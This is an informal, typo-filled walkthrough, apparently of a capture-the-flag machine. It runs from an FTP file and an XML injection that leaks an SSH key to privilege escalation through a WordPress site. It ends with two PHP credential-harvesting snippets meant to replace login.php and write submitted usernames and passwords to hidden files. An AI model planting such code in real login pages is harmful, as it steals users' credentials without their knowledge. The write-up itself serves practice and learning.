we got a file <detail/>subnet<ss/>Â  like this from ftp

and from the site a php file pops up hosts.php if we curl it and give a ==xml== injection

we can get id_rsa from it

and log in

now the privilage esc is AWSM

we se ==wordpress== site adn cliff says i log often so we put a creds ==dumper== at login.php and when we log in it gives us the password

```
<?php
$rrr = print_r($_REQUEST, true);
$fff = fopen("/dev/shm/df", "a");
fwrite($fff, $rrr);
fclose($fff);
?>
```

if we replace login.php with it it gives us ==password== at /dev/shm/df

code 2 :

```
<?php
file_put_contents("/var/www/html/dev_wiki/wp-includes/v3ded.php", $_POST['log'] . " : " . $_POST['pwd'] . "\n", FILE_APPEND);
?>
```
